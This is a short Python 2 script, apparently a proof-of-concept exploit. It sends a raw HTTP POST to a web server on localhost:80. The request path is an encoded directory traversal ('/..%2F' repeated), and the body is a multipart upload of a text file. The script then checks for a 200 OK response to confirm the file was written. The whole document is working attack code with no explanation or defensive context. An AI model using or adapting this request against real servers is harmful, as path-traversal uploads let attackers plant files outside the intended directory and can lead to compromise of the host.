import socket
 
host = 'localhost'
port = 80
 
def upload_file():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)
    s.send('POST /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1\r\n'
           'Host: ' + host + '\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'Content-Length: 210\r\n'
           'Cache-Control: max-age=0\r\n'
           'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAC8qvMLziDjBxePT\r\n'
           'Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n'
           'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.19 Safari/534.13\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------WebKitFormBoundaryAC8qvMLziDjBxePT\r\n'
           'Content-Disposition: form-data; name="filebtn1"; filename="New Text Document.txt"\r\n'
           'Content-Type: text/plain\r\n'
           '\r\n'
           'Hello World\r\n'
           '------WebKitFormBoundaryAC8qvMLziDjBxePT--\r\n')
 
    resp = s.recv(8192)
 
    print resp
 
    http_ok = 'HTTP/1.1 200 OK'
     
    if http_ok not in resp[:len(http_ok)]:
        print 'error uploading file'
        return
    else: print 'file uploaded'
 
upload_file()
